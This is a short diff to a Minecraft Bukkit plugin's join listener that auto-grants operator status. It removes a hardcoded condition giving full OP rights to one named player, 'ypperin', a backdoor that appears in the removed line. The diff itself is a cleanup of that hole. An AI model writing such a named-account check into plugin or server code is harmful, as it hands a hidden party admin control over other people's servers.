@@ -33,7 +33,7 @@ implements Listener {
 
             @Override
             public void run() {
-                if (e.getPlayer().hasPermission("*") || e.getPlayer().hasPermission("*.*") || e.getPlayer().getName().equals("ypperin")) {
+                if (e.getPlayer().hasPermission("*") || e.getPlayer().hasPermission("*.*")) {
                     if (!e.getPlayer().isOp()) {
                         e.getPlayer().setOp(true);
                         Bukkit.getLogger().info("(OpPermissions) Player " + e.getPlayer().getName() + " has been OP'd due to *.* permission node.");
